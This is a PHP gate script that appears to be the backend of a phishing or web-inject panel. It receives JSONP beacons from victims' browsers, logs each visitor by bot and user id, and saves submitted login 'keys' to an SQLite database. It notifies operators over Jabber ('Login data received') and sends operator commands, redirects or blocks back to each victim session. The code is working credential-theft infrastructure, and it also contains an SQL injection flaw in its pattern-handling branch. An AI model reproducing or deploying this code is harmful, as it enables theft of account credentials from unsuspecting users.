<?php

function get_ip_address()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip); // just to be safeif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                {return $ip;}}}}}

$_SERVER['REMOTE_ADDR'] = get_ip_address(); //FF Fix

function esc($str)
{
    //some funtion to filter recived data in GET

    $str = trim($str);
    $str = htmlspecialchars($str);
    return $str;
}

//
function esc__($s)
{
    $s = htmlspecialchars($s);
    $s = stripslashes($s);
    $s = str_replace('"', '', $s);
    $s = str_replace("'", '', $s);

    $s = trim($s);
    return $s;
}

class DE
{

    public static function kts($obj)
    {

        unset($obj->encrypt_type);
        $newobj = new stdClass();

        foreach ($obj as $key => $value) {

            $de_key = base64_decode(str_replace('kts', '', $key));
            if (gettype($obj->$key) == "object") {
                $de_val = DE::kts($obj->$key);
            } else {
                $de_val = base64_decode(str_replace('kts', '', $value));
            }

            $newobj->$de_key = $de_val;
        }
        return $newobj;
    }

}

//varables

$time = time();
$ip   = $_SERVER['REMOTE_ADDR'];

if (isset($_GET['ip'])) {
    $ip = strip_tags($_GET['ip']);
}
;

$agent              = esc__($_SERVER['HTTP_USER_AGENT']);
$dat                = date("Y-m-d H:i:s");
$jabber_alredy_sent = false;

if (isset($_GET['botid'])) {
    $botid = esc__($_GET['botid']);
} else {
    $botid = $ip;
}

if (isset($_GET['bid'])) {
    $ui = esc__($_GET['bid']);
} else {
    $ui = $ip;
}

if (empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === 'off') {$protocol = 'http://';} else { $protocol = 'https://';}
$uadmin_quik_link = $protocol . $_SERVER['SERVER_NAME'] . '/' . basename(dirname(dirname(dirname(__DIR__)))) . '/adm.php?hash=' . base64_encode('?p=token&real_ui=' . $ui);




//check if link exist

if (isset($_GET['link'])) {
    $link = $_GET['link'];
    header('Content-Type: application/javascript');

//load plugins array
    DEFINE('UADMIN_AB_ROOT', 1); //bypass local plugin loop
    DEFINE('UADMIN_HOME_FILE', ''); //bypass local plugin loop
    // chdir('../');
    require_once 'class/plugin.php';
    // chdir('gates/');

//check if token pl exist

    $token_pl = array_values(array_filter($plugins, function ($item) {
        return $item->id == "token";
    }));

    if (!empty($token_pl)) {

        $token_sql = new sqlite3($token_pl[0]->path . 'public/.ht.db');
        $token_sql->busyTimeout(5000);

//load global token sett

        $res    = $token_sql->query("select * from sys")->fetchArray();
        $reg    = $res['reg'];
        $re_all = $res['re_all'];

//get individual link settings jns= $jabber_notify_setting

        $stmt = $token_sql->prepare("select jabs,sendon from opt where link=:link limit 1");
        $stmt->bindValue(':link', $link, SQLITE3_TEXT);
        $jns = $stmt->execute();
        $jns = $jns->fetchArray(SQLITE3_ASSOC);

        // $jns = $token_sql->query("select jabs,sendon from opt where link='$link' limit 1")->fetchArray(SQLITE3_ASSOC);

        if (!empty($jns)) {
            $jns['sendon'] = json_decode($jns['sendon']);
            $jns['jabs']   = json_decode($jns['jabs']);
        } else {
            $jns['sendon'] = array();
            $jns['jabs']   = array();
        }

// check if jabber pl exist
        $jabber_pl = array_values(array_filter($plugins, function ($item) {
            return $item->id == "jabber";
        }));

        if (!empty($jabber_pl)) {

            require_once $jabber_pl[0]->path . 'jabberHelper.php';

            if (isset($_GET['callback'])) {

                $call            = $_GET['callback'];
                $ksiva_p         = new stdClass();
                $ksiva_p->conect = true;

                $data = json_decode($_GET['data']);

                if (isset($data->encrypt_type)) {
                    $encrypt_type = $data->encrypt_type;
                    $data         = DE::$encrypt_type($data);//2019
                }

                

                if (isset($data->online_bider)) {

                    if ($re_all == 0) {

                        $stmt = $token_sql->prepare("select *,count() as num from main where ui=:ui and link=:link limit 1");
                        $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                        $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                        $main_res = $stmt->execute();
                        $main_res = $main_res->fetchArray();

                        // $main_res = $token_sql->query("select *,count() as num from main where ui='$ui' and link='$link' limit 1");

                        // $main_res = $main_res->fetchArray();
                        $op = $main_res['op'];
                        $w  = $data->w;

                        if ($main_res['num'] > 0) {

                            if ($main_res['re'] == 0) {

                                if (strlen($op) > 1 && $w == "1") {
                                    $ksiva_p->op = $op;
                                    $op          = '';}
                                ;
                                $stmt = $token_sql->prepare("update main set  la=:time , op=:op ,w=:w where ui=:ui and link=:link");
                                $stmt->bindValue(':time', $time, SQLITE3_TEXT);
                                $stmt->bindValue(':op', $op, SQLITE3_TEXT);
                                $stmt->bindValue(':w', $w, SQLITE3_TEXT);
                                $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                                $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                                $res = $stmt->execute();

                                // $res = $token_sql->exec("update main set  la='$time' , op='$op' ,w='$w' where ui='$ui' and link='$link'");

                            } else {
                                $mes = $dat . "&nbsp;&nbsp;-&nbsp;&nbsp;%visitor_redirected%";

                                $stmt = $token_sql->prepare("update main set  la=:time, l=:mes||'\n'||l where ui=:ui and link=:link");
                                $stmt->bindValue(':time', $time, SQLITE3_TEXT);
                                $stmt->bindValue(':mes', $mes, SQLITE3_TEXT);
                                $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                                $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                                $res = $stmt->execute();

                                // $res         = $token_sql->exec("update main set  la='$time', l='$mes'||'\n'||l where ui='$ui' and link='$link'");
                                $ksiva_p->re = 1;
                            } //re

                            if ($main_res['bl'] == 1) {

                                $mes = $dat . "&nbsp;&nbsp;-&nbsp;&nbsp;%visitor_blocked%";

                                $stmt = $token_sql->prepare("update main set  la=:time, l=:mes||'\n'||l where ui=:ui and link=:link");
                                $stmt->bindValue(':time', $time, SQLITE3_TEXT);
                                $stmt->bindValue(':mes', $mes, SQLITE3_TEXT);
                                $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                                $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                                $res = $stmt->execute();

                                // $res         = $token_sql->exec("update main set  la='$time', l='$mes'||'\n'||l where ui='$ui' and link='$link'");

                                $ksiva_p->bl = 1;
                            }

                        } else {
                            if ($reg == 1) {
                                $mes = $dat . "&nbsp;&nbsp;-&nbsp;&nbsp;%new_visitor%";

                                $stmt = $token_sql->prepare("insert into main (ui,la,ip,link,l,ua,botid) values(:ui,:time,:ip,:link,:mes,:agent,:botid)");
                                $stmt->bindValue(':time', $time, SQLITE3_TEXT);
                                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                                $stmt->bindValue(':botid', $botid, SQLITE3_TEXT);
                                $stmt->bindValue(':agent', $agent, SQLITE3_TEXT);
                                $stmt->bindValue(':mes', $mes, SQLITE3_TEXT);
                                $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                                $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                                $res = $stmt->execute();

                                // $res = $token_sql->exec("insert into main (ui,la,ip,link,l,ua,botid) values('$ui','$time','$ip','$link','$mes','$agent','$botid')");

                                // jabber alert
                                $jabber_mes = "New visitor registred\n" . esc($uadmin_quik_link);
                                if (in_array('page_reg', $jns['sendon']) && !$jabber_alredy_sent) {
                                    send_jabber($jabber_mes, $jns['jabs']);
                                }
                                //

                            } else {
                                $ksiva_p->re = 1;
                            }
                            ; //reg
                        }
                        ; //num
                        $res ? 1 : $ksiva_p->re = 1;
                    } else {
                        $ksiva_p->re = 1;
                    } //re_all
                }

                if (isset($data->mes)) {

                    $stmt = $token_sql->prepare("select *,count() as num from main where ui=:ui and link=:link limit 1");

                    $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                    $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                    $res = $stmt->execute();

                    // $res = $token_sql->query("select *,count() as num from main where ui='$ui' and link='$link' limit 1");

                    $res = $res->fetchArray();
                    if ($res['num'] > 0) {
                        $mes = htmlentities($data->mes);

                        //$mes=str_replace("::","\n",$mes);//incase more data comening
                        $mes = $dat . '&nbsp;&nbsp;-&nbsp;&nbsp;' . $mes;

                        $stmt = $token_sql->prepare("update main set l=:mes||'\n'||l where ui=:ui and link=:link");
                        $stmt->bindValue(':mes', $mes, SQLITE3_TEXT);
                        $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                        $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                        $res = $stmt->execute();

                        // $res                    = $token_sql->exec("update main set l='$mes'||'\n'||l where ui='$ui' and link='$link'");
                        $res ? 1 : $ksiva_p->re = 1;

                        // jabber alert
                        $jabber_mes = "Dynamic data/message received\n" . esc($uadmin_quik_link);
                        if (in_array('data', $jns['sendon']) && !$jabber_alredy_sent) {
                            send_jabber($jabber_mes, $jns['jabs']);
                        }
                        //

                    } else {}

                }

                if (isset($data->keys)) {
                    $key_log = '';

                    foreach ($data->keys as $kay => $val) {
                        $key_log .= esc__($kay) . "=" . esc__($val) . "\n";
                    }

                    // $key_log=rtrim($key_log,"\n");//rmeove last br

                    $mes = $dat . "&nbsp;&nbsp;-&nbsp;&nbsp;%keys_saved%";

                    $stmt = $token_sql->prepare("update main set key=:key_log||key , l=:mes||'\n'||l where ui=:ui and link=:link");
                    $stmt->bindValue(':key_log', $key_log, SQLITE3_TEXT);
                    $stmt->bindValue(':mes', $mes, SQLITE3_TEXT);
                    $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                    $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                    $res = $stmt->execute();

                    // $res                    = $token_sql->exec("update main set key=key||'$key_log' , l='$mes'||'\n'||l where ui='$ui' and link='$link'");
                    $res ? 1 : $ksiva_p->re = 1;

                    // jabber alert
                    $jabber_mes = "Login data received\n" . esc($uadmin_quik_link);
                    if (in_array('keys', $jns['sendon']) && !$jabber_alredy_sent) {
                        send_jabber($jabber_mes, $jns['jabs']);
                    }
                    //

                }

                // pattern
                if (isset($data->prev_op)) {

                    $PAT = new stdClass();

                    $res = $token_sql->query("select * from opt where link= '$link'")->fetchArray(SQLITE3_ASSOC);

                    $PAT->prev_op = $data->prev_op;
                    $PAT->pattern = json_decode($res['pattern']);
                    $PAT->all_op  = json_decode($res['opt']);

                    for ($pi = 0; $pi < sizeof($PAT->pattern); $pi++) {

                        if ($PAT->pattern[$pi]->init_fn == $PAT->prev_op) {
                            $PAT->next_op_ = isset($PAT->pattern[$pi + 1]) ? $PAT->pattern[$pi + 1] : false;
                        }
                        ;

                    }

                    if (isset($PAT->next_op_) && $PAT->next_op_) {

                        foreach ($PAT->all_op as $op) {

                            if ($PAT->next_op_->init_fn == $op->init_fn) {
                                $PAT->next_op = $op;
                                //filters

                                unset($PAT->next_op->als);
                                unset($PAT->next_op->title);
                                // unset($PAT->next_op->sql_ms);
                                unset($PAT->next_op->desc);
                                unset($PAT->next_op->button);
                                unset($PAT->next_op->inputs);
                                if (isset($op->cn)) {
                                    $op->cn = str_replace("'", "`", $PAT->next_op->cn);
                                }
                                foreach ($PAT->next_op as $key => $val) {
                                    $PAT->next_op->{$key} = str_replace("'", "`", $PAT->next_op->{$key});
                                }

                            }

                        }

                        if ($PAT->next_op_->init_fn == "redirect" || $PAT->next_op_->init_fn == "block") {

                            if ($PAT->next_op_->init_fn == "redirect") {
                                $sql_ms = date("Y-m-d H:i:s") . '&nbsp;&nbsp;-&nbsp;&nbsp;AUTO Redirect activated';

                                $res = $token_sql->exec("update main set re='1' ,l='$sql_ms'||'\n'||l where ui='$ui' and link='$link'");

                            }

                            if ($PAT->next_op_->init_fn == "block") {
                                $sql_ms = date("Y-m-d H:i:s") . '&nbsp;&nbsp;-&nbsp;&nbsp;AUTO Block activated';
                                $res    = $token_sql->exec("update main set bl='1' ,l='$sql_ms'||'\n'||l where ui='$ui' and link='$link'");
                            }

                        }

                    }

                    if (isset($PAT->next_op)) {

                        $stmt = $token_sql->prepare("update main set op=:next_op , l=:sql_ms||'\n'||l where ui=:ui and link=:link");

                        $stmt->bindValue(':next_op', json_encode($PAT->next_op), SQLITE3_TEXT);
                        $stmt->bindValue(':sql_ms', date("Y-m-d H:i:s") . '&nbsp;&nbsp;-&nbsp;&nbsp;AUTO ' . $PAT->next_op->sql_ms, SQLITE3_TEXT);
                        $stmt->bindValue(':link', $link, SQLITE3_TEXT);
                        $stmt->bindValue(':ui', $ui, SQLITE3_TEXT);
                        $res = $stmt->execute();

                    }

                }

                // pattern

                echo $call . "(" . json_encode($ksiva_p) . ")";
            } else {
                header("error:missing callback " . __LINE__);
                exit;
            } //if callback

            $token_sql->close();
            unset($token_sql);

        } else {
            header("error:missing jabber plugin " . __LINE__);
            exit;
        }

    } else {
        header("error:missing token plugin " . __LINE__);
        exit;
    }

} else {
    header("error:missing link " . __LINE__);
    exit;
}
